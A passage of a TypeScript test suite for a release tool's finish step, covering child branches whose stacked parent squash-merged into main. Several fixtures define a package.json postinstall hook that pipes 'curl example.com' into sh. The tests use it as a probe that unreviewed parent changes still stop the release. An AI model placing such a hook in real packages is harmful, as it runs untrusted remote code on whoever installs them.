/**
 * finish after a stacked parent squash-merges (GST-1399): the child was reviewed against its parent branch, the parent
 * squash-merged into main, and the child merged main. The review's base (the parent's head) is not on main, but it is a
 * landed stack parent: --reviewed-base takes it, and the route, the fix-check credit and the docs carry compare the child's
 * own patch against each base, so the parent's and main's edits are base, never changes since review. The receipt carry's
 * landed-parent search (GST-1199) finds the parent the same way when main edited the parent's lines after the squash.
 */
import { afterEach, describe, expect, setDefaultTimeout, test } from 'bun:test';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { EXIT } from '../lib/headless-artifacts';
import { extractReceipt } from '../lib/ship-receipt';
import { cleanup, commit, makeFixtureRepo, runBin, type FixtureRepo } from './helpers/pregate-fixture';
import { lineOf, RELEASE, shipFixture, type ShipFx } from './helpers/ship-bin-fixture';

setDefaultTimeout(90_000);
const BIN = path.dirname(RELEASE);
const LANE = 'tests=printf " 3 pass\\n 0 fail\\nRan 3 tests across 1 file. [5.00ms]\\n"';
const ships: ShipFx[] = [];
const repos: FixtureRepo[] = [];
afterEach(() => { while (ships.length) ships.pop()!.cleanup(); while (repos.length) cleanup(repos.pop()!); });
const wtree = (f: ShipFx) => f.run(path.join(BIN, 'gstack-wtree'), []).stdout.trim();
const head = (f: ShipFx) => f.git('rev-parse', 'HEAD').stdout.trim();
const finish = (f: ShipFx, reviewed: string, post: string, extra: string[] = []) => f.run(RELEASE, ['finish', '--base', 'main', '--reviewed-tree', reviewed, '--docs-post', post, '--lane', LANE, ...extra]);
const lines = (n: number, edit: Record<number, string> = {}) => Array.from({ length: n }, (_, i) => edit[i + 1] ?? `export const l${i + 1} = ${i + 1};`).join('\n') + '\n';
const behaviorStop = (paths: string) => `STOP: behavior, tests or build inputs changed since review (${paths}): insert 5–11.5 → 12–14 → 16 before Step 17; plan that Step 9 with gstack-review-plan --post-review, which at the round cap stops for the owner's grant of one scoped fix-check (stage 2.1)`;

const TEST_V0 = "import { expect, test } from 'bun:test';\ntest('lands', () => { expect(1).toBe(1); });\n";
const TEST_V1 = "import { expect, test } from 'bun:test';\ntest('lands direct', () => { expect(1).toBe(1); });\n";
const TEST_V2 = TEST_V1 + "test('lock 502 retries', () => { expect(2).toBe(2); });\n";
const BASE = { 'src/shared.ts': lines(20), 'docs/policy.md': '# Policy\n\nold rule\n', 'test/helpers/data.ts': 'export const rows = [0];\n', 'test/land.test.ts': TEST_V0 };
const PARENT = { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;' }), 'docs/policy.md': '# Policy\n\nparent rule\n', 'test/helpers/data.ts': 'export const rows = [1];\n', 'test/land.test.ts': TEST_V1, 'README.md': '# Fx, from the parent\n' };
const CHILD = { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;', 15: 'export const l15 = 150;' }), 'src/child.ts': 'export const c = 1;\n' };
const CHILD_ONLY = { 'src/child.ts': 'export const c = 1;\n' };
/** Main after the parent's squash: later edits to the parent's files (a doc, a helper, a test, the audited README) and one far from the child's hunk. */
const MAIN_LATER = { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;', 8: 'export const l8 = 80;' }), 'docs/policy.md': '# Policy\n\nparent rule\n\nmain rule\n', 'test/helpers/data.ts': 'export const rows = [1, 2];\n', 'test/land.test.ts': TEST_V2, 'README.md': '# Fx, from the parent\n\nMain moved on.\n' };

/** Merge origin/main; each conflict (the parent's files, which main squashed and then edited) takes main's side, as #4008's merge did. */
function mergeMain(f: ShipFx): void {
  f.git('fetch', '-q', 'origin');
  if (f.git('merge', '-q', '--no-edit', 'origin/main').status === 0) return;
  expect(f.git('checkout', '--theirs', '--', '.').status).toBe(0);
  f.commit('merge main');
}

/**
 * main <- parent (pushed as origin/parent) <- child, reviewed against the parent branch; then the parent squash-merges into
 * main (`land`: false keeps it off main), main moves on, and the child merges main.
 */
function stacked(opts: { land?: boolean; docs?: string[]; base?: Record<string, string>; parentFiles?: Record<string, string>; child?: Record<string, string>; beforeMerge?: (f: ShipFx) => void; mainLater?: Record<string, string>; afterLand?: (f: ShipFx) => void } = {}) {
  const parentFiles = opts.parentFiles ?? PARENT;
  const f = shipFixture(opts.base ?? BASE, parentFiles); ships.push(f);
  const parent = head(f);
  expect(f.git('push', '-q', 'origin', 'feat:parent').status).toBe(0);
  f.write(opts.child ?? CHILD); f.commit('child');
  const passHead = head(f);
  const reviewed = wtree(f);
  expect(f.git('merge-base', 'origin/parent', 'HEAD').stdout.trim()).toBe(parent);
  const fork = f.git('merge-base', 'origin/main', 'HEAD').stdout.trim();
  opts.beforeMerge?.(f);
  const post = path.join(f.root, 'post.json');
  expect(f.run(path.join(BIN, 'gstack-docs-candidate'), ['snapshot', '--out', post, '--audit-id', 'a1', '--mode', 'edit', '--base', 'main', ...(opts.docs ?? ['README.md']).flatMap(d => ['--docs', d])]).status).toBe(0);
  if (opts.land !== false) f.advanceBase(parentFiles);
  f.advanceBase(opts.land === false ? { 'docs/other.md': '# main without the parent\n' } : opts.mainLater ?? MAIN_LATER);
  opts.afterLand?.(f);
  mergeMain(f);
  return { f, parent, fork, passHead, reviewed, post };
}

describe('finish after a stacked parent squash-merges (GST-1399)', () => {
  // Value: protects=a stacked child whose parent squash-merged and that merged main finishes with the parent's head as its
  //   reviewed base, and the parent's and main's later edits to the parent's doc, helper, test and audited README route as
  //   base (#4008 paid two review exceptions and a split for them); fails_when=finish refuses the parent's head as not on
  //   origin/main, or compares from the old fork point and lists the parent's files as changed since review;
  //   seam=lib/ship-release.ts reviewedBaseCommit and route; no_claim=gstack-ship-receipt carry
  test('the landed parent is the reviewed base and the parent\'s and main\'s edits route as base', () => {
    const { f, parent, reviewed, post } = stacked();
    expect(f.git('diff', '--quiet', 'origin/main', 'HEAD', '--', 'docs/policy.md', 'test/helpers/data.ts', 'test/land.test.ts', 'README.md').status).toBe(0);
    const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
    expect(lineOf(r.stdout, 'REVIEWED_BASE')).toBe(`REVIEWED_BASE: stack parent ${parent.slice(0, 12)} landed on origin/main at ${f.git('rev-parse', 'origin/main~1').stdout.trim().slice(0, 12)}`);
    expect(lineOf(r.stdout, 'ROUTE')).toMatch(/ behavior=0 docs=0 metadata=0 tests=0 base=6 context=0$/);
    expect(lineOf(r.stdout, 'DOCS')).toBe('DOCS: fresh against the Step 14.5 post-audit snapshot (carried: tests=1 base=4 requested=0)');
    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([0, '']);
  });

  // Value: protects=a release that folded the parent's changelog fragment on main (merge: direct deletes every fragment)
  //   does not hide the landed parent (red-team p1 on #4013); fails_when=the landed check counts the parent's fragment,
  //   which main no longer holds, as an unlanded change; seam=reviewedBaseCommit's pathspec; no_claim=gstack-release-stamp
  test('a release that folded the parent\'s changelog fragment still finds the landed parent', () => {
    const policy = JSON.stringify({ min_gstack_version: '1.95.0.0', changelog_fragments: { dir: 'changelog.d', required_checks: ['free-tests'] } });
    const { f, parent, reviewed, post } = stacked({
      base: { ...BASE, '.gstack/ship-policy.json': policy },
      parentFiles: { ...PARENT, 'changelog.d/parent.md': '- the parent\n' },
      mainLater: { 'docs/other.md': '# main moves on\n' },
      afterLand: g => {
        g.git('fetch', '-q', 'origin');
        expect(g.git('checkout', '-q', '--detach', 'origin/main').status).toBe(0);
        expect(g.git('rm', '-q', 'changelog.d/parent.md').status).toBe(0);
        g.write({ 'CHANGELOG.md': '# Changelog\n\n## [1.0.1.0]\n\n- the parent\n' });
        g.commit('release: fold the changelog fragments');
        expect(g.git('push', '-q', 'origin', 'HEAD:main').status).toBe(0);
        expect(g.git('checkout', '-q', 'feat').status).toBe(0);
      },
    });
    expect(f.git('cat-file', '-e', 'origin/main:changelog.d/parent.md').status).not.toBe(0);
    const resurrected = finish(f, reviewed, post, ['--reviewed-base', parent]);
    expect([resurrected.status, lineOf(resurrected.stdout, 'STOP')]).toEqual([3, expect.stringContaining('authored docs changed since review (changelog.d/parent.md)')]);
    expect(f.git('rm', '-q', 'changelog.d/parent.md').status).toBe(0);
    f.commit('drop the parent\'s fragment the merge kept');
    const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
    expect([r.status, lineOf(r.stdout, 'STOP'), lineOf(r.stdout, 'REVIEWED_BASE')]).toEqual([0, '', expect.stringContaining(`stack parent ${parent.slice(0, 12)} landed on origin/main`)]);
  });

  // Value: protects=a parent change main never received in a path the child did not touch since review (a package.json
  //   postinstall), and a merge that kept a parent line main fixed since, still stop: the route reads every path the branch
  //   ships against main, not only paths changed since review (outside voice on #4013); fails_when=finish reads only the
  //   reviewed-vs-current paths, or classifies the manifest as release metadata against the reviewed tree; seam=route
  test('an unlanded parent change, or a merge that kept a line main changed, still stops', () => {
    const PKG = '{"name":"fx","version":"1.0.0"}\n';
    const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
    const unlanded = stacked({
      parentFiles: { ...PARENT, 'package.json': POSTINSTALL },
      afterLand: g => g.advanceBase({ 'package.json': PKG }),
    });
    expect(unlanded.f.git('show', 'HEAD:package.json').stdout).toBe(POSTINSTALL);
    const u = finish(unlanded.f, unlanded.reviewed, unlanded.post, ['--reviewed-base', unlanded.parent]);
    expect([u.status, lineOf(u.stdout, 'STOP')]).toEqual([3, behaviorStop('package.json')]);
    const kept = stacked({ mainLater: { ...MAIN_LATER, 'src/shared.ts': lines(20, { 3: 'export const l3 = 31;' }) } });
    expect(kept.f.git('checkout', '-q', kept.passHead, '--', 'src/shared.ts').status).toBe(0);
    kept.f.commit('keep the parent line');
    const k = finish(kept.f, kept.reviewed, kept.post, ['--reviewed-base', kept.parent]);
    expect([k.status, lineOf(k.stdout, 'STOP')]).toEqual([3, behaviorStop('src/shared.ts')]);
  });

  // Value: protects=a parent package.json script main never received still stops after the child's version bump moves the
  //   manifest into the changed-since-review set, and a parent's logic edit to a stamp_paths file main never received stops
  //   (red-team fc3 on #4013); fails_when=a shipped path's release-metadata class is judged against the reviewed tree, or
  //   stamp_paths count as metadata wholesale; seam=route's base-judged class and finishStages' baseRelease
  test('a version bump does not hide a parent script main does not hold', () => {
    const PKG = '{"name":"fx","version":"1.0.0"}\n';
    const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
    const bumped = stacked({ parentFiles: { ...PARENT, 'package.json': POSTINSTALL }, afterLand: g => g.advanceBase({ 'package.json': PKG }) });
    bumped.f.write({ 'package.json': POSTINSTALL.replace('1.0.0', '1.0.1'), VERSION: '1.0.1.0\n' }); bumped.f.commit('bump');
    const b = finish(bumped.f, bumped.reviewed, bumped.post, ['--reviewed-base', bumped.parent]);
    expect([b.status, lineOf(b.stdout, 'STOP')]).toEqual([3, behaviorStop('package.json')]);
  });

  test('a parent logic edit to a stamp_paths file main does not hold stops', () => {
    const policy = JSON.stringify({ min_gstack_version: '1.95.0.0', stamp_paths: ['src/policy.ts'] });
    const stamped = stacked({
      base: { ...BASE, '.gstack/ship-policy.json': policy, 'src/policy.ts': 'export const allow = () => false;\n' },
      parentFiles: { ...PARENT, 'src/policy.ts': 'export const allow = () => true;\n' },
      afterLand: g => g.advanceBase({ 'src/policy.ts': 'export const allow = () => false;\n' }),
    });
    expect(stamped.f.git('show', 'HEAD:src/policy.ts').stdout).toBe('export const allow = () => true;\n');
    const s = finish(stamped.f, stamped.reviewed, stamped.post, ['--reviewed-base', stamped.parent]);
    expect([s.status, lineOf(s.stdout, 'STOP')]).toEqual([3, behaviorStop('src/policy.ts')]);
  });

  // Value: protects=a landed stack parent never takes #4020's bounded route: an audit edit to code-classed policy prose made
  //   after review, which a child reviewed against the base sends to one scoped reader, stops for Steps 5–11.5 on the
  //   stacked path; fails_when=finish offers boundedPaths candidates when --reviewed-base is a landed stack parent;
  //   seam=route's boundedPaths call
  test('the stacked-parent path never takes the bounded route', () => {
    const POLICY = (edit: Record<number, string> = {}) => '# Review policy\n\n' + Array.from({ length: 12 }, (_, i) => edit[i + 1] ?? `- rule ${i + 1}: a reviewer reads the hunk.`).join('\n') + '\n';
    const { f, parent, reviewed, post } = stacked({
      base: { ...BASE, 'docs/review-policy.md': POLICY() },
      docs: ['README.md', 'docs'],
      beforeMerge: g => { g.write({ 'docs/review-policy.md': POLICY({ 3: '- rule 3: the binary exclusion is plain docs carry.' }) }); g.commit('docs: audit fixes stale policy text'); },
    });
    const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
    expect(lineOf(r.stdout, 'REVIEWED_BASE')).toContain(`stack parent ${parent.slice(0, 12)} landed`);
    expect(lineOf(r.stdout, 'ROUTE')).not.toContain('bounded=');
    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('docs/review-policy.md')]);
  });

  // Value: protects=a review-loop exception with no files list cannot accept a parent change main never received: its
  //   "touched at the fix-check head" set starts at the landed parent, not at the pre-parent fork (red-team p1 on #4021);
  //   fails_when=the loop's atHead runs from merge-base(origin/main, fix_check.head) under a landed stack parent;
  //   seam=route's review-loop exception
  test('a review-loop exception does not accept a parent script main does not hold', () => {
    const PKG = '{"name":"fx","version":"1.0.0"}\n';
    const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
    const { f, parent, passHead, reviewed, post } = stacked({ parentFiles: { ...PARENT, 'package.json': POSTINSTALL }, afterLand: g => g.advanceBase({ 'package.json': PKG }) });
    f.write({ 'package.json': POSTINSTALL.replace('1.0.0', '1.0.1'), VERSION: '1.0.1.0\n' }); f.commit('bump');
    const exception = JSON.stringify({ accepted_by: 'GStack Minder', date: '2026-11-05', via: 'test', reason: 'fixture', fix_check: { head: passHead, findings: 0 } });
    const r = finish(f, reviewed, post, ['--reviewed-base', parent, '--review-loop-exception', exception]);
    expect(lineOf(r.stdout, 'REVIEW_LOOP_EXCEPTION')).not.toContain('package.json');
    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('package.json')]);
  });

  // Value: protects=a base commit whose merge with the parent conflicts never counts as holding it, even when the
  //   conflicted tree keeps the base's bytes (a modify/delete conflict; outside voice on #4021); fails_when=heldBy reads
  //   only the merged tree's diff and ignores merge-tree's conflict status; seam=lib/ship-receipt.ts heldBy
  test('a parent deletion the base never took is not landed, even when the conflicted tree matches the base', () => {
    const base = { ...BASE, 'src/a.ts': lines(10) };
    const f = shipFixture(base, { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;' }) }); ships.push(f);
    expect(f.git('rm', '-q', 'src/a.ts').status).toBe(0); f.commit('parent: drop a.ts');
    const parent = head(f);
    expect(f.git('push', '-q', 'origin', 'feat:parent').status).toBe(0);
    f.write(CHILD_ONLY); f.commit('child');
    const reviewed = wtree(f);
    const post = path.join(f.root, 'post.json');
    expect(f.run(path.join(BIN, 'gstack-docs-candidate'), ['snapshot', '--out', post, '--audit-id', 'a1', '--mode', 'edit', '--base', 'main', '--docs', 'README.md']).status).toBe(0);
    f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;' }), 'src/a.ts': lines(10, { 2: 'export const l2 = 20;' }) });
    f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 300;' }) });
    mergeMain(f);
    const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
    expect(lineOf(r.stdout, 'REVIEWED_BASE')).toBe('');
    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, expect.stringContaining('nor a landed stack parent')]);
  });

  // Value: protects=a landed parent whose tentative VERSION the train restamped in the squash itself is still landed: a
  //   merge-tree conflict only on excluded release metadata does not count against the parent (specialist p2 on #4021);
  //   fails_when=heldBy rejects any conflicted merge, not only one conflicted inside its pathspec; seam=lib/ship-receipt.ts heldBy
  test('a parent whose VERSION the train restamped at landing is still landed', () => {
    const { f, parent, reviewed, post } = stacked({
      parentFiles: { ...PARENT, VERSION: '1.0.1.0\n' },
      land: false,
      afterLand: g => g.advanceBase({ ...PARENT, VERSION: '1.0.2.0\n' }),
    });
    expect(f.git('show', 'HEAD:VERSION').stdout).toBe('1.0.2.0\n');
    const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
    expect(lineOf(r.stdout, 'REVIEWED_BASE')).toBe(`REVIEWED_BASE: stack parent ${parent.slice(0, 12)} landed on origin/main at ${f.git('rev-parse', 'origin/main').stdout.trim().slice(0, 12)}`);
    expect(lineOf(r.stdout, 'STOP')).not.toContain('nor a landed stack parent');
  });

  // Value: protects=a review-loop exception whose fix-check head comes after the child merged main cannot accept a
  //   main-only file edited after it: the "touched at the fix-check head" set starts at the parent only when that head
  //   forked before the parent landed (red-team p2 on #4021); fails_when=the loop's fork is the parent whenever the parent
  //   is an ancestor of the head; seam=route's review-loop exception via patchBase
  test('a loop exception at a post-merge fix-check head does not accept a main-only file edited after it', () => {
    const { f, parent, reviewed, post } = stacked({ base: { ...BASE, 'src/other.ts': lines(5) }, mainLater: { ...MAIN_LATER, 'src/other.ts': lines(5, { 2: 'export const l2 = 20;' }) } });
    const merged = head(f);
    f.write({ 'src/other.ts': lines(5, { 2: 'export const l2 = 20;', 4: 'export const l4 = 40;' }) }); f.commit('edit a main-only file after the fix-check');
    const exception = JSON.stringify({ accepted_by: 'GStack Minder', date: '2026-11-05', via: 'test', reason: 'fixture', fix_check: { head: merged, findings: 0 } });
    const r = finish(f, reviewed, post, ['--reviewed-base', parent, '--review-loop-exception', exception]);
    expect(lineOf(r.stdout, 'REVIEW_LOOP_EXCEPTION')).toContain('accepted none');
    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('src/other.ts')]);
  });

  // Value: protects=a conflicted parent deletion of a file whose name git C-quotes (a double quote) is still a conflict
  //   inside the pathspec, so the parent is not landed (fix-check p2 on #4021); fails_when=heldBy reads merge-tree's
  //   conflicted names without -z and compares quoted names to raw ones; seam=lib/ship-receipt.ts heldBy
  test('a parent deletion the base never took is not landed when git quotes the file name', () => {
    const odd = 'src/we"ird.ts';
    const f = shipFixture({ ...BASE, [odd]: lines(10) }, { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;' }) }); ships.push(f);
    expect(f.git('rm', '-q', odd).status).toBe(0); f.commit('parent: drop the oddly named file');
    const parent = head(f);
    expect(f.git('push', '-q', 'origin', 'feat:parent').status).toBe(0);
    f.write(CHILD_ONLY); f.commit('child');
    const reviewed = wtree(f);
    const post = path.join(f.root, 'post.json');
    expect(f.run(path.join(BIN, 'gstack-docs-candidate'), ['snapshot', '--out', post, '--audit-id', 'a1', '--mode', 'edit', '--base', 'main', '--docs', 'README.md']).status).toBe(0);
    f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;' }), [odd]: lines(10, { 2: 'export const l2 = 20;' }) });
    f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 300;' }) });
    mergeMain(f);
    const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
    expect(lineOf(r.stdout, 'REVIEWED_BASE')).toBe('');
    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, expect.stringContaining('nor a landed stack parent')]);
  });

  // Value: protects=a reviewed executable bit reverted to main's mode after review is not held by main, so it stops
  //   (outside voice on #4013); fails_when=baseHolds compares blob bytes only; seam=lib/ship-patch.ts baseHolds
  test('a reverted mode change stops', () => {
    let exec = '';
    const { f, parent, post } = stacked({ base: { ...BASE, 'bin/run.sh': '#!/bin/sh\necho run\n' }, beforeMerge: g => {
      expect(g.git('update-index', '--chmod=+x', 'bin/run.sh').status).toBe(0);
      expect(g.git('commit', '-qm', 'make it executable').status).toBe(0);
      expect(g.git('checkout', '--', 'bin/run.sh').status).toBe(0);
      exec = g.git('rev-parse', 'HEAD^{tree}').stdout.trim();
    } });
    expect(f.git('update-index', '--chmod=-x', 'bin/run.sh').status).toBe(0);
    expect(f.git('commit', '-qm', 'drop the executable bit').status).toBe(0);
    expect(f.git('checkout', '--', 'bin/run.sh').status).toBe(0);
    expect(f.git('diff', '--quiet', 'origin/main', 'HEAD', '--', 'bin/run.sh').status).toBe(0);
    const r = finish(f, exec, post, ['--reviewed-base', parent]);
    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('bin/run.sh')]);
  });

  // Value: protects=negative control: a child edit after the review still stops with the landed parent as the base;
  //   fails_when=the stack-parent route waves through the child's own post-review change; seam=route; no_claim=-
  test('a child edit after the review still stops', () => {
    const { f, parent, reviewed, post } = stacked();
    f.write({ 'src/child.ts': 'export const c = 2;\n' }); f.commit('edit after review');
    const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('src/child.ts')]);
  });

  // Value: protects=a file whose content equals main's counts as base only when main already holds the reviewed change
  //   (main absorbed the child's hunk); a child file reverted to main's content after the review still stops;
  //   fails_when=equal-to-main waves a post-review revert through, or an absorbed hunk stops; seam=lib/ship-patch.ts baseHolds
  test('equal to main is base when main holds the reviewed change; a revert to main\'s content stops', () => {
    const absorbed = stacked();
    absorbed.f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;', 8: 'export const l8 = 80;', 15: 'export const l15 = 150;', 18: 'export const l18 = 180;' }) });
    mergeMain(absorbed.f);
    expect(absorbed.f.git('diff', '--quiet', 'origin/main', 'HEAD', '--', 'src/shared.ts').status).toBe(0);
    const a = finish(absorbed.f, absorbed.reviewed, absorbed.post, ['--reviewed-base', absorbed.parent]);
    expect([a.status, lineOf(a.stdout, 'ROUTE')]).toEqual([0, expect.stringMatching(/ behavior=0 docs=0 metadata=0 tests=0 base=6 context=0$/)]);
    const reverted = stacked();
    reverted.f.write({ 'src/shared.ts': MAIN_LATER['src/shared.ts'] }); reverted.f.commit('revert the reviewed hunk');
    const v = finish(reverted.f, reverted.reviewed, reverted.post, ['--reviewed-base', reverted.parent]);
    expect([v.status, lineOf(v.stdout, 'STOP')]).toEqual([3, behaviorStop('src/shared.ts')]);
  });

  // Value: protects=negative control: a parent head main never received, or the child's own head, is still refused as a
  //   reviewed base; fails_when=any off-main commit the branch contains widens what routes as base; seam=reviewedBaseCommit
  test('a parent that never landed, or the child\'s own head, is refused', () => {
    const { f, parent, reviewed, post } = stacked({ land: false });
    for (const rb of [parent, head(f)]) {
      const r = finish(f, reviewed, post, ['--reviewed-base', rb]);
      expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, expect.stringContaining(`--reviewed-base ${rb.slice(0, 12)} is not on origin/main`)]);
    }
  });

  // Value: protects=a granted fix-check's credit for a file main also edited holds when the fix commit's own patch runs from
  //   the landed parent (#4008's fix_checked paths); fails_when=the fix-check side compares from the old fork point and
  //   credits nothing, so the fixed file routes as behavior; seam=route's fix-check sides; no_claim=Step 11.5's binding
  test('a granted fix-check keeps its credit after the parent lands', () => {
    let fixHead = '';
    let passHead = '';
    const s = stacked({
      beforeMerge: f => {
        passHead = head(f);
        f.write({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;', 15: 'export const l15 = 151;' }) }); f.commit('fix the round-2 blocker');
        fixHead = head(f);
        const a = f.run(path.join(BIN, 'gstack-approvals'), ['add', '--ask', `Owner grant: one scoped fix-check after round 2 (review_loop_grant ${passHead.slice(0, 12)})`, '--words', 'one scoped fix-check', '--by', 'GStack Minder', '--scope', 'this /ship invocation', '--json'], { GSTACK_APPROVALS_MIRROR: '0' });
        expect(a.status).toBe(0);
        const start = f.run(path.join(BIN, 'gstack-review-log'), ['--start', 'review-fix-check']);
        expect(f.run(path.join(BIN, 'gstack-review-log'), [JSON.stringify({ skill: 'review-fix-check', timestamp: '2026-11-04T00:00:00Z', via: 'ship', review_scope: 'frozen', status: 'clean', issues_found: 0, critical: 0, completed: true, converged: true, range_base: passHead }), '--finish', start.stdout.trim()]).status).toBe(0);
      },
    });
    const r = finish(s.f, s.reviewed, s.post, ['--reviewed-base', s.parent]);
    expect(lineOf(r.stdout, 'FIX_CHECK')).toStartWith(`FIX_CHECK: reviewed src/shared.ts (fix-check at ${fixHead.slice(0, 12)}, range from ${passHead.slice(0, 12)}`);
    expect([r.status, lineOf(r.stdout, 'ROUTE')]).toEqual([0, expect.stringMatching(/ behavior=0 docs=0 metadata=0 tests=0 base=5 context=0 fix_checked=1$/)]);
  });
});

describe('receipt carry after main edits a landed parent\'s lines (GST-1399)', () => {
  const SUB = "exports.add = (a, b) => a + b;\nexports.sub = (a, b) => a - b;\n";
  // Value: protects=a child whose receipt was written against main while stacked carries once its parent squash-merged, even
  //   when main then edited the parent's own lines before the child merged main (#4008: #4003 edited #4007's lines);
  //   fails_when=the landed-parent search merges the parent into the current base tip only, conflicts on those lines, finds
  //   no parent and compares from the old fork point; seam=lib/ship-patch.ts heldBy via landedStackParent; no_claim=-
  test('the landed parent is found after main edited its lines', () => {
    const repo = makeFixtureRepo(); repos.push(repo);
    repo.git('checkout', '-q', '-b', 'parent');
    const parent = commit(repo, { 'lib/util.js': SUB }, 'parent: sub');
    repo.git('checkout', '-q', 'feature');
    repo.git('reset', '-q', '--hard', parent);
    const child = commit(repo, { 'lib/retry.js': 'exports.MAX_RETRIES = 4;\n' }, 'child: four retries');
    const body = path.join(repo.root, 'body.md');
    expect(runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '8', '--base', 'main', '--version', '1.0.0', '--session-kind', 'unattended', '--body', body]).status).toBe(EXIT.ok);
    repo.git('checkout', '-q', 'main');
    commit(repo, { 'lib/util.js': SUB }, 'squash: parent (#7)');
    commit(repo, { 'lib/util.js': SUB.replace('a - b;', 'Number(a) - Number(b);') }, 'main edits the parent\'s line');
    repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-q', 'feature');
    try { repo.git('merge', '-q', '--no-edit', 'origin/main'); } catch { repo.git('checkout', '--theirs', '--', 'lib/util.js'); repo.git('add', '-A'); repo.git('commit', '-q', '--no-edit'); }
    const head = repo.git('rev-parse', 'HEAD');
    const out = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--base', 'main']);
    expect([out.status, out.out]).toEqual([EXIT.ok, expect.stringContaining(`CARRY: carried from ${child.slice(0, 12)} to ${head.slice(0, 12)}`)]);
    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.carry!.reason).toBe(`stack parent ${parent.slice(0, 12)} landed + base merge`);
  }, 90_000);
});


describe('stacked-parent loop-exception matrix (GST-1399)', () => {
  // Value: protects=every merge order (the child merged main before the parent landed, after, never) × parent state
  //   (squash, squash then a main edit of its lines, a release fold, unlanded) × fix-check head (before any merge, the
  //   merge, after it) keeps a review-loop exception from accepting a parent change main never took (the postinstall and
  //   stamp_paths probes, run in every cell) or a main-only file, while the child's own file edited after the fix-check is
  //   accepted (fix-check p2 on #4021); fails_when=the exception's "touched at the fix-check head" set starts at the parent
  //   for a head after a main merge, or at the head's merge base for one whose merge predates the landing;
  //   seam=route's review-loop exception and heldBy; no_claim=the route without an exception
  const PKG = '{"name":"fx","version":"1.0.0"}\n';
  const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
  const DENY = 'export const allow = () => false;\n';
  const ALLOW = 'export const allow = () => true;\n';
  const POLICY = JSON.stringify({ min_gstack_version: '1.95.0.0', stamp_paths: ['src/policy.ts'], changelog_fragments: { dir: 'changelog.d', required_checks: ['free-tests'] } });
  const FRAGMENT = 'changelog.d/parent.md';
  type Order = 'before' | 'after' | 'never';
  type State = 'squash' | 'edited' | 'fold' | 'unlanded';
  type At = 'pre' | 'merge' | 'post';
  const cells: [Order, State, At][] = [];
  for (const order of ['before', 'after', 'never'] as const) for (const state of ['squash', 'edited', 'fold', 'unlanded'] as const)
    for (const at of order === 'never' ? ['pre'] as const : ['pre', 'merge', 'post'] as const) cells.push([order, state, at]);

  function mainEdit(f: ShipFx, files: Record<string, string>, rm: string[]): void {
    f.git('fetch', '-q', 'origin');
    expect(f.git('checkout', '-q', '--detach', 'origin/main').status).toBe(0);
    expect(f.git('rm', '-q', ...rm).status).toBe(0);
    f.write(files); f.commit('main moves');
    expect(f.git('push', '-q', 'origin', 'HEAD:main').status).toBe(0);
    expect(f.git('checkout', '-q', 'feat').status).toBe(0);
  }

  /** One cell: with probes, the parent also adds a postinstall script and a stamp_paths logic edit that main never takes, and the child edits both after the fix-check. */
  function cell(order: Order, state: State, at: At, probes: boolean) {
    const parentFiles: Record<string, string> = { ...PARENT, [FRAGMENT]: '- the parent\n', ...(probes ? { 'package.json': POSTINSTALL, 'src/policy.ts': ALLOW } : {}) };
    const f = shipFixture({ ...BASE, '.gstack/ship-policy.json': POLICY, 'src/policy.ts': DENY, 'src/other.ts': lines(5) }, parentFiles); ships.push(f);
    const parent = head(f);
    expect(f.git('push', '-q', 'origin', 'feat:parent').status).toBe(0);
    f.write(CHILD); f.commit('child');
    const heads: Partial<Record<At, string>> = { pre: head(f) };
    const reviewed = wtree(f);
    const post = path.join(f.root, 'post.json');
    expect(f.run(path.join(BIN, 'gstack-docs-candidate'), ['snapshot', '--out', post, '--audit-id', 'a1', '--mode', 'edit', '--base', 'main', '--docs', 'README.md']).status).toBe(0);
    f.advanceBase({ 'src/other.ts': lines(5, { 2: 'export const l2 = 20;' }), 'docs/other.md': '# main moves\n' });
    let landed = false;
    const land = () => {
      if (state === 'unlanded') { f.advanceBase({ 'docs/later.md': '# main without the parent\n' }); return; }
      f.advanceBase(parentFiles);
      if (probes) f.advanceBase({ 'package.json': PKG, 'src/policy.ts': DENY });
      if (state === 'edited') f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 31;' }) });
      if (state === 'fold') mainEdit(f, { 'CHANGELOG.md': '# Changelog\n\n## [1.0.1.0]\n\n- the parent\n' }, [FRAGMENT]);
      landed = true;
    };
